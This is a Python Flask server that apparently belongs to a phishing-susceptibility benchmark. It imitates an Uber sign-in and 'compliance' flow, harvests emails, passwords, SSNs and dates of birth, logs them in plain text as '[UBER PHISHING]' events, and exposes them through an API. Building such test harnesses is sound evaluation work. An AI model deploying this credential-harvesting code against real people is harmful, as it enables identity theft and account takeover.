import json
import os
from datetime import datetime

from flask import Flask, jsonify, render_template, request
from flask_cors import CORS

config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
with open(config_path, 'r', encoding='utf-8') as f:
    config = json.load(f)

template_dir = os.path.join(os.path.dirname(__file__), 'templates')
app = Flask(__name__, template_folder=template_dir)
CORS(app)
PORT = config['ports']['uber']

captured_data_file = os.path.join(os.path.dirname(__file__), 'captured_data.json')
interaction_log_file = os.path.join(os.path.dirname(__file__), 'interaction_log.json')

captured_data = []
if os.path.exists(captured_data_file):
    with open(captured_data_file, 'r', encoding='utf-8') as f:
        try:
            captured_data = json.load(f)
        except json.JSONDecodeError:
            captured_data = []

interaction_log = []
if os.path.exists(interaction_log_file):
    with open(interaction_log_file, 'r', encoding='utf-8') as f:
        try:
            interaction_log = json.load(f)
        except json.JSONDecodeError:
            interaction_log = []

step_data = {}

HIGH_SENSITIVITY_FIELDS = {'password': 'Account Password', 'ssn': 'Social Security Number'}
MEDIUM_SENSITIVITY_FIELDS = {'user': 'Email or Mobile Number', 'dob': 'Date of Birth'}
LOW_SENSITIVITY_FIELDS = {}

STEP_NAMES = {
    0: 'Passive Capture or Legitimate Exit',
    1: 'Account Lookup',
    2: 'Password Gate',
    3: 'Compliance Check',
}


def get_session_key():
    return f"{request.remote_addr}|{request.headers.get('User-Agent', 'unknown')}"


def save_captured():
    with open(captured_data_file, 'w', encoding='utf-8') as f:
        json.dump(captured_data, f, indent=2)


def save_interactions():
    with open(interaction_log_file, 'w', encoding='utf-8') as f:
        json.dump(interaction_log, f, indent=2)


def log_interaction(action, details):
    entry = {
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'details': details,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
    }
    interaction_log.append(entry)
    save_interactions()
    print(f"[UBER PHISHING] {action}: {json.dumps(details, ensure_ascii=True)}")


def classify_pii(data):
    high = [{'field': f, 'label': l, 'value': data[f]} for f, l in HIGH_SENSITIVITY_FIELDS.items() if data.get(f)]
    medium = [{'field': f, 'label': l, 'value': data[f]} for f, l in MEDIUM_SENSITIVITY_FIELDS.items() if data.get(f)]
    low = [{'field': f, 'label': l, 'value': data[f]} for f, l in LOW_SENSITIVITY_FIELDS.items() if data.get(f)]
    return {'high': high, 'medium': medium, 'low': low}


def remember_step(step, data):
    key = get_session_key()
    if key not in step_data:
        step_data[key] = {'started_at': datetime.now().isoformat(), 'steps_completed': [], 'data': {}}
    step_data[key]['data'].update(data)
    if step not in step_data[key]['steps_completed']:
        step_data[key]['steps_completed'].append(step)
    step_data[key]['last_step'] = step
    step_data[key]['last_updated'] = datetime.now().isoformat()


def record_step(step, data):
    remember_step(step, data)
    pii = classify_pii(data)
    log_interaction('step_completed', {
        'step': step,
        'step_name': STEP_NAMES.get(step, f'Step {step}'),
        'pii_captured': {
            'high': [item['field'] for item in pii['high']],
            'medium': [item['field'] for item in pii['medium']],
            'low': [item['field'] for item in pii['low']],
        },
        'data': data,
    })
    return pii


def store_submission(entry_type, step, data):
    pii = classify_pii(data)
    captured_data.append({
        'timestamp': datetime.now().isoformat(),
        'type': entry_type,
        'step': step,
        'step_name': STEP_NAMES.get(step, f'Step {step}'),
        'data': data,
        'pii_severity': pii,
        'steps_reached': step_data.get(get_session_key(), {}).get('steps_completed', []),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
    })
    save_captured()
    return pii


def log_win(action_name):
    record_step(0, {'legitimate_action_taken': True, 'action': action_name, 'timestamp': datetime.now().isoformat()})


@app.route('/')
def index():
    log_interaction('page_view', 'landing')
    return render_template('e24-uber.html')


@app.route('/api/save-step', methods=['POST'])
def save_step():
    payload = request.json or {}
    return jsonify({'success': True, 'step': payload.get('step', 0), 'saved': bool(record_step(payload.get('step', 0), payload.get('data', {})))})


@app.route('/api/login/submit', methods=['POST'])
def login_submit():
    payload = request.json or {}
    data = {'user': payload.get('user', '').strip()}
    record_step(1, data)
    store_submission('login_submit', 1, data)
    return jsonify({'success': True})


@app.route('/api/password/submit', methods=['POST'])
def password_submit():
    payload = request.json or {}
    data = {'password': payload.get('password', '').strip()}
    record_step(2, data)
    store_submission('password_submit', 2, data)
    return jsonify({'success': True})


@app.route('/api/compliance/submit', methods=['POST'])
def compliance_submit():
    payload = request.json or {}
    data = {'ssn': payload.get('ssn', '').strip(), 'dob': payload.get('dob', '').strip()}
    record_step(3, data)
    store_submission('compliance_submit', 3, data)
    return jsonify({'success': True})


@app.route('/api/win/use-uber-app', methods=['POST'])
def win_use_uber_app():
    log_win('returned_to_official_uber_app')
    return jsonify({'success': True})


@app.route('/api/captured')
def get_captured():
    return jsonify({'total_submissions': len(captured_data), 'submissions': captured_data, 'partial_sessions': step_data})


@app.route('/api/interactions')
def get_interactions():
    return jsonify({'total_interactions': len(interaction_log), 'interactions': interaction_log})


@app.route('/api/clear')
def clear_data():
    global captured_data, interaction_log, step_data
    captured_data = []
    interaction_log = []
    step_data = {}
    for path in [captured_data_file, interaction_log_file]:
        if os.path.exists(path):
            os.remove(path)
    return jsonify({'success': True, 'message': 'All data cleared'})


@app.route('/api/health')
def health():
    return jsonify({'status': 'healthy', 'site': 'uber', 'port': PORT, 'captured_count': len(captured_data), 'active_sessions': len(step_data), 'interaction_count': len(interaction_log)})


if __name__ == '__main__':
    print(f"\n{'!' * 60}")
    print("  Uber Verification Benchmark")
    print(f"  Running on http://localhost:{PORT}")
    print(f"  Domain mapping: {config['domains']['uber']}")
    print(f"{'!' * 60}\n")
    app.run(host='0.0.0.0', port=PORT, debug=True)
